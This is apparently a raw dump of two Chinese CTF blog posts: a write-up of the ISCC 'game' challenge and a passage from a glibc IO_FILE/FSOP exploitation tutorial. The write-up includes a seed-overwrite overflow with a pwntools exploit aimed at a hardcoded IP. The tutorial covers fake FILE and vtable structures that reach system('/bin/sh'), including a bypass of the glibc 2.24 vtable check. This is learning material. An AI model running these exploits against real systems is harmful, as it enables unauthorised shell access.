(0,&buf,0x2cull)\n```\n将0x2c(44个字节)的内容读入buf\n然而若读入44个字节正好能覆盖掉seed\n\n而如果我们写入值覆盖seed，rand()函数生成的随机数就可以被我们预测出。\n\n此处用aaaa覆盖掉seed的四个字节\naaaa变为整型是0x61616161\n通过仿照原程序写代码可以得到每一次要输出的值\n```c\n#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n\tint v3;\n\tint v7;\n\tsrand(0x61616161);\n\tfor(int i=0;i<=9;i++)\n\t{\n\tv3=rand();\n\tsrand(v3);\n\tv7=rand()%100+1;\n\tprintf(\"%d\\n\",v7);\n\t}\n\treturn 0;\n}\n```\n用gcc编译链接后得到可执行程序，运行后得到：\n\n这些就是9次猜数字的答案\n\n接下来是exp\n```python\nfrom pwn import*\nr=remote('39.96.88.40',7040)\nr.recv()\npayload=(0x30-0x4)*'a'\nr.sendline(payload)\nr.interactive()\n```\n建立连接后依次输出得到的9个答案\n就能得到shell\n\n","source":"_posts/ISCC_game.md","raw":"---\ntitle: ISCC_game\ndate: 2023-01-02 19:50:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- stackoverflow\n- misc\n---\n\n随机数猜数字的程序，改种子后自己写程序预测出数字。\n\n<!-- more -->\n\n首先查壳，是64位的，没有栈保护，动态链接，NX可执行\n\n这是个猜数字的程序。程序中用函数rand和srand生成随机数。第一次的种子seed=time(0)用srand(seed)生成第二次的种子v3，再用v3生成随机数v7\n\n```c\nint v7=rand()%0x64+1;\n```\n当我们连续9次猜对v7的时候，就会执行flag(),我们就成功了!\n但只要有一次猜错，都会执行exit(0)\n\n这题和之前写过的猜数字挺像的\n我们发现程序中的read函数有点问题\n```c\nread (0,&buf,0x2cull)\n```\n将0x2c(44个字节)的内容读入buf\n然而若读入44个字节正好能覆盖掉seed\n\n而如果我们写入值覆盖seed，rand()函数生成的随机数就可以被我们预测出。\n\n此处用aaaa覆盖掉seed的四个字节\naaaa变为整型是0x61616161\n通过仿照原程序写代码可以得到每一次要输出的值\n```c\n#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n\tint v3;\n\tint v7;\n\tsrand(0x61616161);\n\tfor(int i=0;i<=9;i++)\n\t{\n\tv3=rand();\n\tsrand(v3);\n\tv7=rand()%100+1;\n\tprintf(\"%d\\n\",v7);\n\t}\n\treturn 0;\n}\n```\n用gcc编译链接后得到可执行程序，运行后得到：\n\n这些就是9次猜数字的答案\n\n接下来是exp\n```python\nfrom pwn import*\nr=remote('39.96.88.40',7040)\nr.recv()\npayload=(0x30-0x4)*'a'\nr.sendline(payload)\nr.interactive()\n```\n建立连接后依次输出得到的9个答案\n就能得到shell\n\n","slug":"ISCC_game","published":1,"updated":"2023-01-03T15:03:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf3000j5oud8ls9b15m","content":"<p>随机数猜数字的程序，改种子后自己写程序预测出数字。</p>\n<span id=\"more\"></span>\n\n<p>首先查壳，是64位的，没有栈保护，动态链接，NX可执行</p>\n<p>这是个猜数字的程序。程序中用函数rand和srand生成随机数。第一次的种子seed=time(0)用srand(seed)生成第二次的种子v3，再用v3生成随机数v7</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> v7=rand()%<span class=\"number\">0x64</span>+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>当我们连续9次猜对v7的时候，就会执行flag(),我们就成功了!<br>但只要有一次猜错，都会执行exit(0)</p>\n<p>这题和之前写过的猜数字挺像的<br>我们发现程序中的read函数有点问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read (<span class=\"number\">0</span>,&amp;buf,<span class=\"number\">0x2c</span>ull)</span><br></pre></td></tr></table></figure>\n<p>将0x2c(44个字节)的内容读入buf<br>然而若读入44个字节正好能覆盖掉seed</p>\n<p>而如果我们写入值覆盖seed，rand()函数生成的随机数就可以被我们预测出。</p>\n<p>此处用aaaa覆盖掉seed的四个字节<br>aaaa变为整型是0x61616161<br>通过仿照原程序写代码可以得到每一次要输出的值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> v3;</span><br><span class=\"line\">\t<span class=\"type\">int</span> v7;</span><br><span class=\"line\">\tsrand(<span class=\"number\">0x61616161</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tv3=rand();</span><br><span class=\"line\">\tsrand(v3);</span><br><span class=\"line\">\tv7=rand()%<span class=\"number\">100</span>+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v7);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>用gcc编译链接后得到可执行程序，运行后得到：</p>\n<p>这些就是9次猜数字的答案</p>\n<p>接下来是exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;39.96.88.40&#x27;</span>,<span class=\"number\">7040</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">payload=(<span class=\"number\">0x30</span>-<span class=\"number\">0x4</span>)*<span class=\"string\">&#x27;a&#x27;</span></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>建立连接后依次输出得到的9个答案<br>就能得到shell</p>\n","site":{"data":{}},"excerpt":"<p>随机数猜数字的程序，改种子后自己写程序预测出数字。</p>","more":"<p>首先查壳，是64位的，没有栈保护，动态链接，NX可执行</p>\n<p>这是个猜数字的程序。程序中用函数rand和srand生成随机数。第一次的种子seed=time(0)用srand(seed)生成第二次的种子v3，再用v3生成随机数v7</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> v7=rand()%<span class=\"number\">0x64</span>+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>当我们连续9次猜对v7的时候，就会执行flag(),我们就成功了!<br>但只要有一次猜错，都会执行exit(0)</p>\n<p>这题和之前写过的猜数字挺像的<br>我们发现程序中的read函数有点问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read (<span class=\"number\">0</span>,&amp;buf,<span class=\"number\">0x2c</span>ull)</span><br></pre></td></tr></table></figure>\n<p>将0x2c(44个字节)的内容读入buf<br>然而若读入44个字节正好能覆盖掉seed</p>\n<p>而如果我们写入值覆盖seed，rand()函数生成的随机数就可以被我们预测出。</p>\n<p>此处用aaaa覆盖掉seed的四个字节<br>aaaa变为整型是0x61616161<br>通过仿照原程序写代码可以得到每一次要输出的值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> v3;</span><br><span class=\"line\">\t<span class=\"type\">int</span> v7;</span><br><span class=\"line\">\tsrand(<span class=\"number\">0x61616161</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tv3=rand();</span><br><span class=\"line\">\tsrand(v3);</span><br><span class=\"line\">\tv7=rand()%<span class=\"number\">100</span>+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,v7);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>用gcc编译链接后得到可执行程序，运行后得到：</p>\n<p>这些就是9次猜数字的答案</p>\n<p>接下来是exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;39.96.88.40&#x27;</span>,<span class=\"number\">7040</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">payload=(<span class=\"number\">0x30</span>-<span class=\"number\">0x4</span>)*<span class=\"string\">&#x27;a&#x27;</span></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>建立连接后依次输出得到的9个答案<br>就能得到shell</p>"},{"title":"IO_FILE","date":"2023-01-01T16:01:40.000Z","_content":"IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。\n<!-- more -->\n\n在linux中，一切都被当作文件处理，那自然就包括了IO，IO_FILE就是用来描述IO的文件结构体。所有的文件流文件都是_IO_FILE_plus的结构。\n\n```c\nstruct _IO_FILE_plus\n{\n    _IO_FILE file; //完整的结构体内容\n    const struct _IO_jump_t* vtable; //仅有一个指针\n}\n```\n\n其中file是文件流，是linux中用于描述文件的结构，包含文件的关键数据，vtable则是一个**虚表（虚拟函数表）**，保存的是各种操作函数的指针，在对文件流进行操作时，实际是调用该虚表中的函数。\n\n为了管理所有的IO流，存在一个**全局变量**\\_IO_list_all的指针，这个指针指向**IO_2_1_stderr** 这个IO_FILE结构体，_IO_FILE结构体中会通过指针形成链表连接在一起。\n\n```c\nextern struct _IO_FILE_plus* _IO_list_all; \n```\n\n在使用fopen函数打开文件时，会创建一个对应该文件的\\_IO_FILE_plus结构体，并将其存放在**堆**中，其**返回值就是其_IO_FILE结构file**。\n\n除了\\_IO_2_1_stderr\\_（stderr）之外，程序原本还有输入输出流，因此堆中还有\\_IO_2_1_stdout\\_和\\_IO_2_1_stdin\\_。在链表中stderr->stdout->stdin。新加入的IO_FILE会从头（_IO_list_all）处链入链表，因此stdin实际上是链表的最后一个，所以他们的对应文件描述符0(stdin),1(stdout),2(stderr)也是有道理的。\n\n因为_IO_FILE存放在堆中（stderr、stdout、stdin除外，他们在libc中），因此许多对IO_FILE的利用都与堆相关。\n\n完整的`_IO_FILE_plus`结构如下：\n\n```c\n_IO_FILE_plus = {\n\t'amd64':{\n\t\t0x0:'_flags',\n\t\t0x8:'_IO_read_ptr',\n\t\t0x10:'_IO_read_end',\n\t\t0x18:'_IO_read_base',\n\t\t0x20:'_IO_write_base',\n\t\t0x28:'_IO_write_ptr',\n\t\t0x30:'_IO_write_end',\n\t\t0x38:'_IO_buf_base',\n\t\t0x40:'_IO_buf_end',\n\t\t0x48:'_IO_save_base',\n\t\t0x50:'_IO_backup_base',\n\t\t0x58:'_IO_save_end',\n\t\t0x60:'_markers',\n\t\t0x68:'_chain',\n\t\t0x70:'_fileno',\n\t\t0x74:'_flags2',\n\t\t0x78:'_old_offset',\n\t\t0x80:'_cur_column',\n\t\t0x82:'_vtable_offset',\n\t\t0x83:'_shortbuf',\n\t\t0x88:'_lock',\n\t\t0x90:'_offset',\n\t\t0x98:'_codecvt',\n\t\t0xa0:'_wide_data',\n\t\t0xa8:'_freeres_list',\n\t\t0xb0:'_freeres_buf',\n\t\t0xb8:'__pad5',\n\t\t0xc0:'_mode',\n\t\t0xc4:'_unused2',\n\t\t0xd8:'vtable'\n\t}\n}\n```\n\n\n\n## _IO_FILE\n\n其中_IO_FILE的结构如下：\n\n```c\nstruct _IO_FILE {\n  int _flags; /* low-order is flags.*/\n#define _IO_file_flags _flags\n\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n\n  char *_IO_save_base; \n  char *_IO_backup_base; \n  char *_IO_save_end; \n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;/*指向下一个file结构*/\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; \n\n[...]\n  _IO_lock_t *_lock;\n  #ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）\n};\n\nstruct _IO_FILE_complete\n{\n  struct _IO_FILE _file;\n#endif //结束宏判断\n[...] \nint _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n#endif\n};\n```\n\n可以看到_IO_FILE结构中存放着文件的基本信息，比如说：读/写的起始和结束位置，当前读/写位置，缓冲区的起始和结束位置，保存位置等。\n\n比较关键的还有一个\\_chain，它指向下一个\\_IO_FILE结构，通过该指针将所有_IO_FILE连成一个链表。\n\n```c\nstruct _IO_FILE *_chain;/*指向下一个file结构*/\n```\n\n## _IO_JUMP_t虚表\n\n### 虚表和虚函数\n\n虚表和虚函数在C语言中不常见，甚至不像C++那样有virtual关键字实现虚函数。实际上虚表和虚函数是用于实现**多态**这种特性的，而C语言本身是面向过程的，因此没有virtual也在情理之中。\n\n但实际上，C语言是可以做到面向对象的，通过struct结构体可以实现类似类的结构，**结构体中的数据就相当于是类中的成员变量，结构体中的函数指针就相当于是类中的成员函数**。\n\n但是这种方法本身也有些弊端，每个结构体实例都会包含所有的函数指针，而每个函数指针都要占据空间（即使其没有被使用）。因此在C语言编程中很少会有将函数指针写在结构体内的，而是在结构体外写一个函数，通过参数传入结构体的实例来对结构体进行操作。实际上在C++中，如果没有virtual关键字的话，编译器也会采取类似的方法对成员函数进行处理。\n\n但如果要实现**多态**的话，就不能用这种节省内存的方法了。对于C语言而言，就是将函数指针放在结构体中，每一个结构体实例通过该函数指针指向自己定义的函数，并且通过该函数指针调用它，这样的函数就可以说是虚函数。\n\n那虚表是什么呢？毕竟虚函数的数量可能不止一个，并且和一般的函数有些不一样（存在其他同名函数），为了方便对每个实例的虚函数进行管理，就有了虚表这种结构。**虚表实际上就是虚函数的表，用来管理虚函数**，虚表是从属于该类的，会通过一个指针指向该虚表。\n\n### _IO_JUMP_T结构\n\n_IO_jump_t结构如下:\n\n```c\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME\nstruct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);//0\n    JUMP_FIELD(size_t, __dummy2);//1 DUMMY\n    JUMP_FIELD(_IO_finish_t, __finish);//2 finish\n    JUMP_FIELD(_IO_overflow_t, __overflow);//3 overflow\n    JUMP_FIELD(_IO_underflow_t, __underflow);//4 underflow\n    JUMP_FIELD(_IO_underflow_t, __uflow);//5 uflow\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);//6 pbackfail \n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);//7 xsputn\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);//8 xsgetn\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);//9 seekoff\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);//10 seekpos\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);//11 setbuf\n    JUMP_FIELD(_IO_sync_t, __sync);//12 sync\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);//13 doallocate\n    JUMP_FIELD(_IO_read_t, __read);//14 read\n    JUMP_FIELD(_IO_write_t, __write);//15 write\n    JUMP_FIELD(_IO_seek_t, __seek);//16 seek\n    JUMP_FIELD(_IO_close_t, __close);//17 close\n    JUMP_FIELD(_IO_stat_t, __stat);//18 stat\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);//19 showmanyc\n    JUMP_FIELD(_IO_imbue_t, __imbue);//20 imbue\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n```\n\n对文件操作的函数都会调用该文件流中vtable中的函数\n\n### 部分文件操作函数简介\n\n#### fread\n\nfread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下:\n\n```c\nsize_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;\n```\n\nfread 的代码位于 /libio/iofread.c 中，函数名为\\_IO_fread，但真正的功能实现在子函数\\_IO_sgetn 中。在\\_IO_sgetn 函数中会取出vtable中的\\_IO_XSGETN并调用。\n\n#### fwrite\n\nfwrite 也是标准 IO 库函数，作用是向文件流写入数据，函数原型如下：\n\n```c\nsize_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n```\n\nfwrite 的代码位于 / libio/iofwrite.c 中，函数名为\\_IO_fwrite。 在\\_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。调用\\_IO_XSPUTN需要首先取出 vtable 中的指针，再跳过去进行调用。\n\n#### fopen\n\nfopen 在标准 IO 库中用于打开文件，函数原型如下:\n\n```c\nFILE *fopen(char *filename, *type);\n```\n\n首先fopen中会为该文件创建一个FILE结构，由于其内部**使用malloc函数为FILE结构分配空间**，因此该FILE结构在堆上。\n\n之后fopen会初始化vtable的内容，并调用_IO_file_init 对FILE初始化操作。\n\n最后fopen会将该IO_FILE链入_IO_list_all指向的链表中，并调用系统调用open。\n\n```c\n//可见_chain指向的是更先创建的IO_FILE，_IO_list_all指向的始终是最后创建的IO_FILE\nfp->file._chain = (_IO_FILE *) _IO_list_all;\n_IO_list_all = fp;\n```\n\n#### fclose\n\nfclose 是标准 IO 库中用于关闭已打开文件的函数，函数原型如下：\n\n```c\nint fclose(FILE *stream);\n```\n\nfclose和fopen的操作正好相反，fclose首先会调用\\_IO_unlink_it 将指定的 FILE 从\\_chain 链表中脱链。\n\n之后会调用\\_IO_file_close_it 函数，\\_IO_file_close_it 会调用系统接口 close 关闭文件。\n\n最后调用 vtable 中的\\_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构。\n\n#### printf/puts\n\nprintf 和 puts 是常用的输出函数，在 printf 的参数是以'\\n'结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。\n\nputs 在源码中实现的函数是\\_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的\\_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。\n\nprintf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现\n\n```c\nvfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite\n```\n\n## IO_FILE利用\n\n### 对fileno的利用\n\n每个文件流都有一个文件描述符`stdin:0, stdout:1, stderr:2`，这个文件描述符保存在`IO_FILE+0x70`的`fileno`字段。\n\n修改该字段能够修改文件处理的位置，本来`fileno==0`表示从标准输入中读取，修改为`3`则表示为从文件描述符为`3`的文件（已经`open`的文件）中读取。\n\n### 伪造 vtable 劫持程序流程(libc2.23及以前)\n\n许多与文件相关的操作都要对IO_FILE进行操作，这就离不开_IO_FILE_plus中的vtable，一些函数会从vtable中取出函数指针进行调用。因此如果能伪造vtable的话，我们就能劫持程序的流程。\n\n伪造vtable一般有两种做法:\n\n1. 直接修改vtable中的函数指针\n2. 覆盖vtable指向我们控制的内存，并在其中伪造vtable\n\n### FSOP\n\nFSOP 是 File Stream Oriented Programming 的缩写（面向文件流编程），进程内所有的\\_IO_FILE 结构会使用`_chain` 域相互连接形成一个链表，`_IO_list_all` 指向链表头。\n\nFSOP 的核心思想就是**劫持`_IO_list_all` 来伪造链表和其中的\\_IO_FILE 项（包括file和vtable）**。只要劫持了`_IO_list_all`并在对应位置伪造_IO_FILE项，就相当于劫持了所有关于文件的数据和操作。\n\n单纯的伪造只是构造了数据，不能达到**劫持程序流程**的目的。FSOP 选择调用`_IO_flush_all_lockp`来劫持程序流，这个函数会刷新`_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用`_IO_FILE_plus.vtable` 中的`_IO_overflow`，最终的效果就是执行`_IO_overflow(fp)`。\n\n因此如果能将`_IO_overflow`修改为`system`，将`file`结构的`flag`修改为`\"/bin/sh\\x00\"`，就可以通过`_IO_overflow(fp)`执行`system(\"/bin/sh\\x00\")`\n\n```c\nint _IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))//伪造的IO_FILE要满足的条件\n               && _IO_OVERFLOW (fp, EOF) == EOF) \n           {\n               result = EOF;\n          }\n        ...\n       fp=fp->_chain;\n  }\n  return result;\n}\n```\n\n从上面代码可以看到，要执行`_IO_overflow(fp)`，伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n1. 当 libc检测到**内存错误**， 执行 abort 流程时（可以通过malloc等函数触发）（glibc-2.26删除）\n2. 当执行 exit 函数时\n3. 当执行流从 main 函数返回时\n\n```c\n._chain = chunk_addr //伪造_chain\nchunk_addr\n{\n  file = {\n    _flags = \"/bin/sh\\x00\", //对应此结构体首地址(fp)\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = heap_addr\n}\nheap_addr\n{\n  __dummy = 0x0,\n  __dummy2 = 0x0,\n  __finish = 0x0,\n  __overflow = system_addr,\n    ...\n}\n```\n\n\n\n## glibc2.24后的IO_FILE利用\n\n从glibc2.24开始，加入了对vtable的检查，会对vtable的合法性进行检查。glibc中有一段完整的内存存放着各个vtable，`__start___libc_IO_vtables`和`__stop___libc_IO_vtables` 分别指向第一个和最后一个vtable，只有其中的vtable和外部的合法vtable可以通过检查正常使用，否则会引发abort。\n\n```c\n/* Check if unknown vtable pointers are permitted; otherwise,\n   terminate the process.  */\nvoid _IO_vtable_check (void) attribute_hidden;\n/* Perform vtable pointer validation.  If validation fails, terminate\n   the process.  */\nstatic inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  /* Fast path: The vtable pointer is within the __libc_IO_vtables\n     section.  */\n  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;\n  uintptr_t ptr = (uintptr_t) vtable;\n  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;\n  if (__glibc_unlikely (offset >= section_length))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\n```\n\n这个检查的调用流程如下（IO函数使用宏调用）：\n\n```c\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n \n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)\n \n# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) //检查在这里\n```\n\n在调用vtable中函数时会对其vtable合法性进行检查。\n\n因此我们伪造的`vtable`要在`glibc`的`vtable`段中，从而得以绕过该检查。\n目前来说，有四种思路：利用`_IO_str_jumps`中`_IO_str_overflow()`函数和`_IO_str_finish()`函数与利用`_IO_wstr_jumps`中对应的这两种函数。\n\n### _IO_str_jumps的FSOP(2.28及以后失效)\n\n`libc`中不仅仅只有`_IO_file_jumps`这么一个`vtable`，还有一个叫`_IO_str_jumps`的 ，这个`vtable`可以通过对vtable的检查。\n\n```c\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish), //this\n  JUMP_INIT(overflow, _IO_str_overflow), //this\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n下面是一些相关的结构\n\n```c\nstruct _IO_str_fields\n{\n \t_IO_alloc_type _allocate_buffer;\n \t_IO_free_type _free_buffer;\n};\n\ntypedef struct _IO_strfile_\n{\n \tstruct _IO_streambuf _sbf;\n \tstruct _IO_str_fields _s;\n} _IO_strfile;\n\nstruct _IO_streambuf\n{\n  FILE _f;\n  const struct _IO_jump_t *vtable;\n};\n```\n\n由于libc中没有_IO_str_jumps的符号，因此需要自己找\n\n```py\n# libc.address = libc_base\ndef get_IO_str_jumps():\n    IO_file_jumps_addr = libc.sym['_IO_file_jumps']\n    IO_str_underflow_addr = libc.sym['_IO_str_underflow']\n    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):\n        possible_IO_str_jumps_addr = ref - 0x20\n        if possible_IO_str_jumps_addr > IO_file_jumps_addr:\n            return possible_IO_str_jumps_addr\n```\n\n如果能设置vtable为``_IO_str_jumps``，那就可以调用其中的函数，如果其中的函数有问题，自然就可以利用。\n\n------\n\n在`_IO_str_jumps`中的`_IO_str_overflow`就有可以利用的地方。\n\n```c\nint _IO_str_overflow (_IO_FILE *fp, int c)\n{\n  int flush_only = c == EOF;\n  _IO_size_t pos;\n  if (fp->_flags & _IO_NO_WRITES)// pass\n      return flush_only ? 0 : EOF;\n  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n    {\n      fp->_flags |= _IO_CURRENTLY_PUTTING;\n      fp->_IO_write_ptr = fp->_IO_read_ptr;\n      fp->_IO_read_ptr = fp->_IO_read_end;\n    }\n  pos = fp->_IO_write_ptr - fp->_IO_write_base;\n  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in \n    {\n      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // pass\n    return EOF;\n      else\n    {\n      char *new_buf;\n      char *old_buf = fp->_IO_buf_base;\n      size_t old_blen = _IO_blen (fp);\n      _IO_size_t new_size = 2 * old_blen + 100;\n      if (new_size < old_blen)//pass 一般会通过\n        return EOF;\n      new_buf\n        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);//target [fp+0xe0]\n      if (new_buf == NULL)\n        {\n          /*      __ferror(fp) = 1; */\n          return EOF;\n        }\n      if (old_buf)\n        {\n          memcpy 